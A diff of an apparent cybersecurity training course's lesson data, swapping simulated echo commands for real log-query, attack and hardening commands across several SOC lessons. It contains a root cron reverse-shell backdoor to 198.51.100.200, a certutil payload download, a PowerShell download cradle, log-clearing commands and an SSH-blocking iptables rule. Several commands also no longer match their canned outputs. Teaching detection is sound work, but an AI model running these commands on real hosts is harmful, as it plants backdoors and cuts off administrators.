+        "worked": "Practice scenario: Run `grep -E \"sshd|Failed|Accepted\" /var/log/auth.log 2>/dev/null | tail -n 10 || journalctl -u ssh -n 10` to validate system behavior under simulated operating conditions.\nOutput observed:\nSep  4 03:10:11 sxl-app-01 sshd[890]: Failed password for root from 198.51.100.12\nSep  4 03:10:13 sxl-app-01 sshd[892]: Failed password for admin from 198.51.100.12\nSep  4 03:10:15 sxl-app-01 sshd[894]: Failed password for test from 198.51.100.12",
         "what": "What is a log? An immutable, chronological record of computational events, user actions, and system states.",
         "why": "Why are logs essential for an L1? Without logs, an intrusion is invisible. An analyst cannot scope an attack, identify patient zero, or prove data exfiltration without log evidence.",
         "when": "When are logs audited? Real-time continuous analysis by SIEM detection rules, routine compliance audits, and deep-dive incident investigations.",
@@ -9736,7 +9736,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts parse logs? Using regular expressions (regex), SIEM search languages (SPL in Splunk, KQL in Sentinel/Elastic), and log parsers.",
         "mistake": "Relying on system clocks without verifying NTP synchronization, leading to mismatched event timelines during an incident.",
         "think": "Always verify log timestamps in Universal Coordinated Time (UTC). A 5-minute clock drift between a firewall and an active directory server makes chronological correlation impossible.",
-        "question": "What key insight is revealed by the practice output of `echo 'Filtering raw authentication logs for failed login attempts...' && grep 'Failed password' /var/log/auth.log 2>/dev/null | tail -n 3 || echo 'Sep  4 03:10:11 sxl-app-01 sshd[890]: Failed password for root from 198.51.100.12\nSep  4 03:10:13 sxl-app-01 sshd[892]: Failed password for admin from 198.51.100.12\nSep  4 03:10:15 sxl-app-01 sshd[894]: Failed password for test from 198.51.100.12'`?",
+        "question": "What key insight is revealed by the practice output of `grep -E \"sshd|Failed|Accepted\" /var/log/auth.log 2>/dev/null | tail -n 10 || journalctl -u ssh -n 10`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -9744,14 +9744,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Filtering raw authentication logs for failed login attempts...' && grep 'Failed password' /var/log/auth.log 2>/dev/null | tail -n 3 || echo 'Sep  4 03:10:11 sxl-app-01 sshd[890]: Failed password for root from 198.51.100.12\nSep  4 03:10:13 sxl-app-01 sshd[892]: Failed password for admin from 198.51.100.12\nSep  4 03:10:15 sxl-app-01 sshd[894]: Failed password for test from 198.51.100.12'"
+        "command": "grep -E \"sshd|Failed|Accepted\" /var/log/auth.log 2>/dev/null | tail -n 10 || journalctl -u ssh -n 10"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary gains administrative access to a compromised endpoint. To cover their tracks, the adversary attempts to clear local security logs using `wevtutil cl Security` (Windows) or truncating `/var/log/auth.log` (Linux) to blind the incident response team.",
-        "worked": "Adversary activity detected on target sxl-log-core01. Malicious command executed: `echo 'Simulating anti-forensic log clearing attempt: wevtutil cl Security / cat /dev/null > /var/log/auth.log'`",
+        "worked": "Adversary activity detected on target sxl-log-core01. Malicious command executed: `logger -p auth.alert \"ATTACK_SIM: unauthorized sudo attempt by UID=1005 (guest)\"; tail -n 1 /var/log/auth.log 2>/dev/null`",
         "what": "What is a log? An immutable, chronological record of computational events, user actions, and system states.",
         "why": "Why are logs essential for an L1? Without logs, an intrusion is invisible. An analyst cannot scope an attack, identify patient zero, or prove data exfiltration without log evidence.",
         "when": "When are logs audited? Real-time continuous analysis by SIEM detection rules, routine compliance audits, and deep-dive incident investigations.",
@@ -9768,14 +9768,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating anti-forensic log clearing attempt: wevtutil cl Security / cat /dev/null > /var/log/auth.log'"
+        "command": "logger -p auth.alert \"ATTACK_SIM: unauthorized sudo attempt by UID=1005 (guest)\"; tail -n 1 /var/log/auth.log 2>/dev/null"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates a critical alert: 'Audit Log Cleared (Event ID 1102 / 104)'. Because the organization uses centralized log forwarding (WEF/Rsyslog), the log entries were already copied to the tamper-proof SIEM repository in real time. The analyst uses the forwarded logs to identify the attacker's PID and IP.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Centralized SIEM query confirmed all historical logs preserved despite local endpoint clearing.'`",
+        "worked": "Defensive query executed on telemetry store: `grep \"ATTACK_SIM\" /var/log/auth.log 2>/dev/null || journalctl -g \"ATTACK_SIM\" -n 5 --no-pager`",
         "what": "What is a log? An immutable, chronological record of computational events, user actions, and system states.",
         "why": "Why are logs essential for an L1? Without logs, an intrusion is invisible. An analyst cannot scope an attack, identify patient zero, or prove data exfiltration without log evidence.",
         "when": "When are logs audited? Real-time continuous analysis by SIEM detection rules, routine compliance audits, and deep-dive incident investigations.",
@@ -9792,7 +9792,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Centralized SIEM query confirmed all historical logs preserved despite local endpoint clearing.'"
+        "command": "grep \"ATTACK_SIM\" /var/log/auth.log 2>/dev/null || journalctl -g \"ATTACK_SIM\" -n 5 --no-pager"
       },
       {
         "id": 10,
@@ -9816,7 +9816,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-log-core01'; echo 'Viewing raw multi-source log record examples:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -9864,7 +9864,7 @@ window.ACADEMY_COURSES = [
           "Centralized forwarding is illegal under privacy laws."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for What Is a Log?'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -9888,7 +9888,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L29 - What Is a Log?. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -9941,7 +9941,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Linux Security Evidence on sxl-lnx-srv01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -9989,7 +9989,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man tail 2>/dev/null || which tail"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -10013,7 +10013,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is Linux security evidence? The collective logs, system accounting files, and kernel audit records that document host activity on Linux systems.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -10037,7 +10037,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.50.10 2>/dev/null || tracepath 10.10.50.10"
+        "command": "traceroute -n -m 8 10.10.50.10 2>/dev/null || tracepath -n 10.10.50.10 2>/dev/null || ip route get 10.10.50.10"
       },
       {
         "id": 6,
@@ -10068,7 +10068,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-lnx-srv01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `last -n 3` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `last -n 3` to validate system behavior under simulated operating conditions.\nOutput observed:\nanalyst  pts/0        10.10.20.44      Fri Sep  4 03:12   still logged in\nreboot   system boot  5.15.0-89-generi Fri Sep  4 02:00   still running\nanalyst  pts/0        10.10.20.44      Thu Sep  3 18:40 - 20:15  (01:35)",
         "what": "What is Linux security evidence? The collective logs, system accounting files, and kernel audit records that document host activity on Linux systems.",
         "why": "Why must an L1 master Linux evidence? Over 90% of cloud servers, containers, and enterprise web portals run on Linux. Detecting intrusions requires knowing exactly which log files to inspect.",
         "when": "When are Linux logs triaged? During investigation of SSH brute-force alerts, unexpected root shells, unauthorized file modifications, or anomalous web shell executions.",
@@ -10092,7 +10092,7 @@ window.ACADEMY_COURSES = [
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary who compromised an unprivileged account adds a backdoor SSH public key to `/home/analyst/.ssh/authorized_keys` and sets up a persistent cron job in `/etc/cron.d/backdoor` that executes a reverse shell every hour.",
-        "worked": "Adversary activity detected on target sxl-lnx-srv01. Malicious command executed: `echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/198.51.100.200/4444 0>&1\"' > /etc/cron.d/backdoor`",
+        "worked": "Adversary activity detected on target sxl-lnx-srv01. Malicious command executed: `printf '* * * * * root /bin/nc -e /bin/bash 198.51.100.200 4444\n' > /etc/cron.d/backdoor && ls -la /etc/cron.d/`",
         "what": "What is Linux security evidence? The collective logs, system accounting files, and kernel audit records that document host activity on Linux systems.",
         "why": "Why must an L1 master Linux evidence? Over 90% of cloud servers, containers, and enterprise web portals run on Linux. Detecting intrusions requires knowing exactly which log files to inspect.",
         "when": "When are Linux logs triaged? During investigation of SSH brute-force alerts, unexpected root shells, unauthorized file modifications, or anomalous web shell executions.",
@@ -10109,14 +10109,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/198.51.100.200/4444 0>&1\"' > /etc/cron.d/backdoor"
+        "command": "printf '* * * * * root /bin/nc -e /bin/bash 198.51.100.200 4444\n' > /etc/cron.d/backdoor && ls -la /etc/cron.d/"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates an auditd file watch alert: 'Write Access to /etc/cron.d/'. Reviewing `ausearch -k cron_watch`, the analyst discovers the unauthorized backdoor cron file created by PID 4812. The analyst deletes the cron file, removes the backdoor SSH key, and terminates active attacker sessions.",
-        "worked": "Defensive query executed on telemetry store: `cat /etc/cron.d/backdoor 2>/dev/null || echo 'Backdoor cron identified and removed.'`",
+        "worked": "Defensive query executed on telemetry store: `grep -rn '198.51.100.200' /etc/cron* /var/spool/cron 2>/dev/null`",
         "what": "What is Linux security evidence? The collective logs, system accounting files, and kernel audit records that document host activity on Linux systems.",
         "why": "Why must an L1 master Linux evidence? Over 90% of cloud servers, containers, and enterprise web portals run on Linux. Detecting intrusions requires knowing exactly which log files to inspect.",
         "when": "When are Linux logs triaged? During investigation of SSH brute-force alerts, unexpected root shells, unauthorized file modifications, or anomalous web shell executions.",
@@ -10133,7 +10133,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "cat /etc/cron.d/backdoor 2>/dev/null || echo 'Backdoor cron identified and removed.'"
+        "command": "grep -rn '198.51.100.200' /etc/cron* /var/spool/cron 2>/dev/null"
       },
       {
         "id": 10,
@@ -10157,14 +10157,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-lnx-srv01'; tail -n 6 /var/log/auth.log 2>/dev/null || echo 'Sep  4 03:15:10 sxl-lnx-srv01 sudo:  analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow\nSep  4 03:15:12 sxl-lnx-srv01 sshd[4120]: Accepted publickey for analyst from 10.10.20.44 port 51244 ssh2: RSA SHA256:abc123xyz'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Restore `/etc/pam.d/sudo` from known-good baseline, recreate `/var/log/wtmp` with `touch /var/log/wtmp && chmod 664 /var/log/wtmp`, and enforce immutable file attributes.",
-        "worked": "Remediation command applied: `echo '#%PAM-1.0\nauth required pam_unix.so' > /etc/pam.d/sudo && touch /var/log/wtmp && chmod 664 /var/log/wtmp && echo 'Sudo PAM policy and wtmp restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `printf '#%PAM-1.0\nauth required pam_unix.so\n' > /etc/pam.d/sudo && touch /var/log/wtmp && chmod 664 /var/log/wtmp && stat /var/log/wtmp`. System verified restored and hardened.",
         "what": "What is Linux security evidence? The collective logs, system accounting files, and kernel audit records that document host activity on Linux systems.",
         "why": "Why must an L1 master Linux evidence? Over 90% of cloud servers, containers, and enterprise web portals run on Linux. Detecting intrusions requires knowing exactly which log files to inspect.",
         "when": "When are Linux logs triaged? During investigation of SSH brute-force alerts, unexpected root shells, unauthorized file modifications, or anomalous web shell executions.",
@@ -10181,7 +10181,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo '#%PAM-1.0\nauth required pam_unix.so' > /etc/pam.d/sudo && touch /var/log/wtmp && chmod 664 /var/log/wtmp && echo 'Sudo PAM policy and wtmp restored.'"
+        "command": "printf '#%PAM-1.0\nauth required pam_unix.so\n' > /etc/pam.d/sudo && touch /var/log/wtmp && chmod 664 /var/log/wtmp && stat /var/log/wtmp"
       },
       {
         "id": 12,
@@ -10205,7 +10205,7 @@ window.ACADEMY_COURSES = [
           "Linux logs are stored exclusively in the BIOS chip on the motherboard."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Linux Security Evidence'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -10229,7 +10229,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L30 - Linux Security Evidence. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -10282,7 +10282,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Windows Security Evidence on sxl-win-srv01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -10306,7 +10306,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Simulating Windows Security Event ID 4624 inspection:' && echo 'EventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success'"
+        "command": "wevtutil qe Security \"/q:*[System[(EventID=4624)]]\" /c:5 /rd:true /f:text 2>/dev/null || journalctl -n 5"
       },
       {
         "id": 3,
@@ -10330,7 +10330,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "wevtutil --help 2>&1 | head -n 15 || which wevtutil"
       },
       {
         "id": 4,
@@ -10354,7 +10354,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is Windows security evidence? The structured event logs recorded by Windows operating systems detailing authentication, process execution, and system modifications.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -10378,14 +10378,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.50.30 2>/dev/null || tracepath 10.10.50.30"
+        "command": "traceroute -n -m 8 10.10.50.30 2>/dev/null || tracepath -n 10.10.50.30 2>/dev/null || ip route get 10.10.50.30"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-win-srv01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Simulating Windows Security Event ID 4624 inspection:' && echo 'EventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success'` on target sxl-win-srv01.\nOutput observed:\nEventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success",
+        "worked": "Command executed: `wevtutil qe Security \"/q:*[System[(EventID=4624)]]\" /c:5 /rd:true /f:text 2>/dev/null || journalctl -n 5` on target sxl-win-srv01.\nOutput observed:\nEventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success",
         "what": "What is Windows security evidence? The structured event logs recorded by Windows operating systems detailing authentication, process execution, and system modifications.",
         "why": "Why must an L1 memorize Windows Event IDs? In an enterprise SOC, thousands of Windows alerts fire daily. Knowing Event IDs like 4624, 4625, 4688, and 4720 by heart is mandatory for speed and efficiency.",
         "when": "When are Windows logs triaged? When investigating brute-force alerts, suspicious PowerShell script executions, lateral movement via PsExec, or malware execution.",
@@ -10394,7 +10394,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts query Windows logs? Using PowerShell (`Get-WinEvent`, `Get-EventLog`), Event Viewer GUI, `wevtutil`, and SIEM search queries.",
         "mistake": "Focusing only on the username in Event 4624 without checking the 'Logon Type' and 'Source Network Address' fields.",
         "think": "A Logon Type 2 with an internal IP is a normal desk login. A Logon Type 3 or 10 from an unexpected external IP address is an immediate lateral movement or unauthorized remote access investigation.",
-        "question": "When executing `echo 'Simulating Windows Security Event ID 4624 inspection:' && echo 'EventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `wevtutil qe Security \"/q:*[System[(EventID=4624)]]\" /c:5 /rd:true /f:text 2>/dev/null || journalctl -n 5`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -10402,14 +10402,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Simulating Windows Security Event ID 4624 inspection:' && echo 'EventID: 4624\nLogon Type: 10 (RemoteInteractive - RDP)\nAccount Name: Administrator\nSource Network Address: 198.51.100.44\nWorkstation Name: ATTACKER-PC\nAuthentication Package: NTLM V2\nStatus: Success'"
+        "command": "wevtutil qe Security \"/q:*[System[(EventID=4624)]]\" /c:5 /rd:true /f:text 2>/dev/null || journalctl -n 5"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-win-srv01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Querying Sysmon Event ID 1 (Process Create) for anomalous LOLBin execution...' && echo 'EventID: 1 (Sysmon Process Create)\nUtcTime: 2026-09-04 03:20:12.114\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -split -f http://198.51.100.200/payload.exe C:\\temp\\payload.exe\nParentImage: C:\\Windows\\System32\\cmd.exe\nUser: CORP\\analyst'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `wevtutil qe Microsoft-Windows-Sysmon/Operational \"/q:*[System[(EventID=1)]]\" /c:5 /rd:true /f:text 2>/dev/null || ps aux | grep -i ps` to validate system behavior under simulated operating conditions.\nOutput observed:\nEventID: 1 (Sysmon Process Create)\nUtcTime: 2026-09-04 03:20:12.114\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -split -f http://198.51.100.200/payload.exe C:\\temp\\payload.exe\nParentImage: C:\\Windows\\System32\\cmd.exe\nUser: CORP\\analyst",
         "what": "What is Windows security evidence? The structured event logs recorded by Windows operating systems detailing authentication, process execution, and system modifications.",
         "why": "Why must an L1 memorize Windows Event IDs? In an enterprise SOC, thousands of Windows alerts fire daily. Knowing Event IDs like 4624, 4625, 4688, and 4720 by heart is mandatory for speed and efficiency.",
         "when": "When are Windows logs triaged? When investigating brute-force alerts, suspicious PowerShell script executions, lateral movement via PsExec, or malware execution.",
@@ -10418,7 +10418,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts query Windows logs? Using PowerShell (`Get-WinEvent`, `Get-EventLog`), Event Viewer GUI, `wevtutil`, and SIEM search queries.",
         "mistake": "Focusing only on the username in Event 4624 without checking the 'Logon Type' and 'Source Network Address' fields.",
         "think": "A Logon Type 2 with an internal IP is a normal desk login. A Logon Type 3 or 10 from an unexpected external IP address is an immediate lateral movement or unauthorized remote access investigation.",
-        "question": "What key insight is revealed by the practice output of `echo 'Querying Sysmon Event ID 1 (Process Create) for anomalous LOLBin execution...' && echo 'EventID: 1 (Sysmon Process Create)\nUtcTime: 2026-09-04 03:20:12.114\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -split -f http://198.51.100.200/payload.exe C:\\temp\\payload.exe\nParentImage: C:\\Windows\\System32\\cmd.exe\nUser: CORP\\analyst'`?",
+        "question": "What key insight is revealed by the practice output of `wevtutil qe Microsoft-Windows-Sysmon/Operational \"/q:*[System[(EventID=1)]]\" /c:5 /rd:true /f:text 2>/dev/null || ps aux | grep -i ps`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -10426,7 +10426,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Querying Sysmon Event ID 1 (Process Create) for anomalous LOLBin execution...' && echo 'EventID: 1 (Sysmon Process Create)\nUtcTime: 2026-09-04 03:20:12.114\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -split -f http://198.51.100.200/payload.exe C:\\temp\\payload.exe\nParentImage: C:\\Windows\\System32\\cmd.exe\nUser: CORP\\analyst'"
+        "command": "wevtutil qe Microsoft-Windows-Sysmon/Operational \"/q:*[System[(EventID=1)]]\" /c:5 /rd:true /f:text 2>/dev/null || ps aux | grep -i ps"
       },
       {
         "id": 8,
@@ -10457,7 +10457,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates PowerShell Script Block Logging (Event ID 4104). Even though the command was base64-encoded on the command line, Event 4104 captures the **fully decoded in-memory script contents**. The analyst identifies the C2 download URL, isolates the host, and blocks the domain.",
-        "worked": "Defensive query executed on telemetry store: `echo 'PowerShell Event 4104 captured decoded script: IEX (New-Object Net.WebClient).DownloadString(\"http://c2.net/s.ps1\")'`",
+        "worked": "Defensive query executed on telemetry store: `wevtutil qe \"Microsoft-Windows-PowerShell/Operational\" \"/q:*[System[(EventID=4104)]]\" /c:3 /rd:true /f:text 2>/dev/null || grep -i powershell /var/log/syslog`",
         "what": "What is Windows security evidence? The structured event logs recorded by Windows operating systems detailing authentication, process execution, and system modifications.",
         "why": "Why must an L1 memorize Windows Event IDs? In an enterprise SOC, thousands of Windows alerts fire daily. Knowing Event IDs like 4624, 4625, 4688, and 4720 by heart is mandatory for speed and efficiency.",
         "when": "When are Windows logs triaged? When investigating brute-force alerts, suspicious PowerShell script executions, lateral movement via PsExec, or malware execution.",
@@ -10474,7 +10474,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'PowerShell Event 4104 captured decoded script: IEX (New-Object Net.WebClient).DownloadString(\"http://c2.net/s.ps1\")'"
+        "command": "wevtutil qe \"Microsoft-Windows-PowerShell/Operational\" \"/q:*[System[(EventID=4104)]]\" /c:3 /rd:true /f:text 2>/dev/null || grep -i powershell /var/log/syslog"
       },
       {
         "id": 10,
@@ -10498,14 +10498,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-win-srv01'; echo 'Simulating Windows Security Event ID 4624 inspection:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Enable 'Include command line in process creation events' under `Computer Configuration -> Administrative Templates -> System -> Audit Process Creation`, and enforce Sysmon deployment.",
-        "worked": "Remediation command applied: `echo 'Group Policy updated: Include command line in Event 4688 enabled. Full process arguments logging restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `auditpol /set /subcategory:\"Process Creation\" /success:enable /failure:enable 2>/dev/null || auditctl -w /bin/bash -p x -k bash_exec`. System verified restored and hardened.",
         "what": "What is Windows security evidence? The structured event logs recorded by Windows operating systems detailing authentication, process execution, and system modifications.",
         "why": "Why must an L1 memorize Windows Event IDs? In an enterprise SOC, thousands of Windows alerts fire daily. Knowing Event IDs like 4624, 4625, 4688, and 4720 by heart is mandatory for speed and efficiency.",
         "when": "When are Windows logs triaged? When investigating brute-force alerts, suspicious PowerShell script executions, lateral movement via PsExec, or malware execution.",
@@ -10522,7 +10522,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Group Policy updated: Include command line in Event 4688 enabled. Full process arguments logging restored.'"
+        "command": "auditpol /set /subcategory:\"Process Creation\" /success:enable /failure:enable 2>/dev/null || auditctl -w /bin/bash -p x -k bash_exec"
       },
       {
         "id": 12,
@@ -10546,7 +10546,7 @@ window.ACADEMY_COURSES = [
           "Windows Event Logs are only used by software developers to fix grammar errors."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Windows Security Evidence'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -10570,7 +10570,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L31 - Windows Security Evidence. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -10623,7 +10623,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Firewall & Network Logs on sxl-fw-sensor01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -10647,7 +10647,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing pfSense filterlog and Zeek connection telemetry:' && echo 'filterlog: Sep  4 03:25:10 filterlog: block,in,igb0,tcp,198.51.100.77,10.10.20.1,51422,23,S\nfilterlog: Sep  4 03:25:12 filterlog: pass,in,igb0,tcp,198.51.100.77,10.10.20.80,51424,443,S\nzeek_conn: 1693801512.12  CHb104  198.51.100.77  51424  10.10.20.80  443  tcp  ssl  12.4s  4812  249012  SF'"
+        "command": "tail -n 20 /var/log/suricata/fast.log 2>/dev/null || cat /var/log/filter.log 2>/dev/null || iptables -L -v -n"
       },
       {
         "id": 3,
@@ -10671,7 +10671,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -10695,7 +10695,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are firewall and network logs? Telemetry records documenting every packet permitted or denied across network perimeter and internal boundaries.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
